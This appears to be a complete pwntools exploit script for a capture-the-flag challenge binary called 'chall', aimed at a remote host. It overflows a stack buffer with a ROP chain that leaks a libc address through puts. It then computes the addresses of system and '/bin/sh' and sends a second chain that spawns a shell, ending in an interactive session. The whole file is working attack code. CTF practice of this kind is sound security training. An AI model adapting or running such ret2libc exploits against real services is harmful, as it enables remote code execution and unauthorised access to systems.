from pwn import *
import time
elf = ELF("./chall")
libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
ld = ELF("./ld-2.23.so")
context.binary=elf
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
target=remote('220.249.52.134',37568)
#context.log_level='DEBUG'

name="B"*0x1f
ret=0x08048ad9
main=0x80487AA
puts_plt=0x8048470
puts_got=0x804b018

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)


ropchain=p32(puts_plt)+p32(main)+p32(puts_got)
sla("> ",name)
payload="\x00"*0x18+p32(0x08048ade)+"A"*4+p32(ret)+ropchain
sla("validate\n> ",payload)
libc_base=u32(target.recv(4))-0x05f140
print("[+] Libc_base="+hex(libc_base))
libc_system=libc_base+0x03a940
libc_binsh=libc_base+0x15902b
ropchain=p32(libc_system)+p32(0xdeadbeef)+p32(libc_binsh)
payload="\x00"*0x18+p32(0x08048ade)+"A"*4+p32(ret)+ropchain
sla("validate\n> ",payload)
target.interactive()
